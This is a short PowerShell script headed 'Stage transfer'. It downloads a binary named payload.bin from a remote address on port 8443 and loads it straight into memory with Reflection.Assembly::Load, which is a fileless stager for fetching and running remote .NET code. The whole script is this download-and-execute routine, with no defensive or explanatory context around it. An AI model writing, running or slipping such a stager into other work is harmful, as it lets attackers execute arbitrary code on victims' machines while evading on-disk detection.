<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://192.0.2.191:8443/payload.bin"
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($TargetUrl)
[Reflection.Assembly]::Load($AssemblyBytes)
$StageMarker = "stage-45"
